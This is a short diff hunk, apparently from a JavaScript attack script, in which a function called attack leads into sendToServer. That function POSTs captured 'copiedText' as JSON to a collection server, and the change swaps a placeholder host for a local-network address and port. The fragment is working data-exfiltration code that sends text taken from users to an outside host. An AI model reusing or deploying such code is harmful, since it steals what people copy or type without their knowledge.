@@ -33,7 +33,7 @@ function attack(userstring) {
 
 function sendToServer(data) {
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://hereisyourserver.com", true);
+    xhr.open("POST", "http://192.168.80.1:8080/", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.send(JSON.stringify({
         copiedText: data
